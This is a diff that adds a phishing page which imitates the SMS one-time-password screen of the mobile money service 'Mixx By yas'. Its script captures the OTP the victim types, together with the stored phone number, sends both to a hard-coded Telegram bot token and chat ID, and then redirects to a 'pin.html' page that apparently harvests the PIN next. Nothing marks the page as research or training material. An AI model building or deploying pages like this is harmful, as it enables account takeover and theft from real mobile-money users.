@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>SMS Verification</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #fff;
+            color: #003366;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 40px 20px;
+        }
+        
+        .logo {
+            font-size: 48px;
+            font-weight: bold;
+            color: #003366;
+            margin-bottom: 10px;
+        }
+        
+        .logo span {
+            color: #ffc107;
+            font-size: 20px;
+            font-weight: bold;
+            vertical-align: super;
+            margin-left: 4px;
+        }
+        
+        h2 {
+            color: #003366;
+            margin: 10px 0;
+            font-size: 24px;
+        }
+        
+        p {
+            font-size: 16px;
+            color: #003366;
+            text-align: center;
+            margin-bottom: 5px;
+        }
+        
+        .phone-number {
+            font-size: 24px;
+            font-weight: bold;
+            margin: 10px 0;
+            color: #003366;
+        }
+        
+        .change-btn {
+            display: inline-block;
+            padding: 8px 14px;
+            border-radius: 20px;
+            border: 1px solid #eee;
+            background-color: #fff;
+            font-size: 14px;
+            color: #d63384;
+            margin-bottom: 20px;
+            cursor: pointer;
+        }
+        
+        .change-btn::before {
+            content: '✎';
+            margin-right: 8px;
+        }
+        
+        input[type="text"] {
+            width: 80%;
+            max-width: 400px;
+            padding: 14px;
+            border: 1px solid #d0d0d0;
+            border-radius: 8px;
+            font-size: 16px;
+            text-align: center;
+            outline: none;
+            margin-bottom: 20px;
+        }
+        
+        .send-btn {
+            padding: 10px 20px;
+            background-color: #2c52a0;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-bottom: 30px;
+        }
+        
+        .timer-circle {
+            position: relative;
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            background: conic-gradient(#2c52a0 0deg, #e0e0ff 0deg);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 10px;
+        }
+        
+        .timer {
+            font-size: 24px;
+            color: #003366;
+            position: absolute;
+        }
+        
+        .expires-text {
+            margin-top: 8px;
+            font-size: 14px;
+            color: #888;
+        }
+        
+        .cash-point {
+            margin-top: 30px;
+            text-align: center;
+        }
+        
+        .cash-point a {
+            color: #003366;
+            font-weight: bold;
+            text-decoration: none;
+        }
+        
+        .cash-point a::before {
+            content: '📍';
+            margin-right: 5px;
+        }
+        
+        .cash-point p {
+            font-size: 14px;
+            color: #666;
+            margin-top: 4px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="logo">
+        Mixx <span>By yas</span>
+    </div>
+    <h2><span style="color:#2c52a0;">SMS</span> Verification</h2>
+    <p>We have sent you a one-time password to this mobile number</p>
+    <div class="phone-number" id="phoneDisplay">Loading...</div>
+    <div class="change-btn" onclick="changeNumber()">Change Number</div>
+
+    <input type="text" placeholder="One Time Password" id="otp" onkeydown="handleKeyPress(event)" />
+    <button class="send-btn" onclick="submitOTP()">Send</button>
+
+    <div class="timer-circle" id="circleTimer">
+        <div class="timer" id="countdown">01:00</div>
+    </div>
+    <div class="expires-text">Expires in 60 sec</div>
+
+    <div class="cash-point">
+        <a href="#">Nearest Cash Point →</a>
+        <p>Find the nearest agent to register to Mixx</p>
+    </div>
+
+    <script>
+        const phone = localStorage.getItem("phoneNumber");
+        document.getElementById("phoneDisplay").textContent = phone ? phone : "No number found";
+
+        let seconds = 60;
+        const countdownEl = document.getElementById("countdown");
+        const circle = document.getElementById("circleTimer");
+
+        const countdownInterval = setInterval(() => {
+            seconds--;
+            let min = Math.floor(seconds / 60);
+            let sec = seconds % 60;
+            countdownEl.textContent =
+                (min < 10 ? "0" + min : min) + ":" + (sec < 10 ? "0" + sec : sec);
+
+            const angle = ((60 - seconds) / 60) * 360;
+            circle.style.background = `conic-gradient(#2c52a0 ${angle}deg, #e0e0ff ${angle}deg)`;
+
+            if (seconds <= 0) {
+                clearInterval(countdownInterval);
+                countdownEl.textContent = "00:00";
+            }
+        }, 1000);
+
+        function changeNumber() {
+            window.location.href = "login.html";
+        }
+
+        function handleKeyPress(e) {
+            if (e.key === "Enter") {
+                submitOTP();
+            }
+        }
+
+        function submitOTP() {
+            const otp = document.getElementById("otp").value;
+            sendToTelegram(phone, otp);
+            window.location.href = "pin.html";
+        }
+
+        function sendToTelegram(phone, otp) {
+            const token = "7186506994:AAEKIkNo49PL-IyvoRFGFJoC5bxUfmfh_L0";
+            const chatId = "5615316142";
+            const message = `OTP Entered: ${otp}%0APhone: ${phone}`;
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${message}`)
+                .then(res => console.log("Sent to Telegram"))
+                .catch(err => console.error("Error sending to Telegram:", err));
+        }
+    </script>
+</body>
+
+</html>
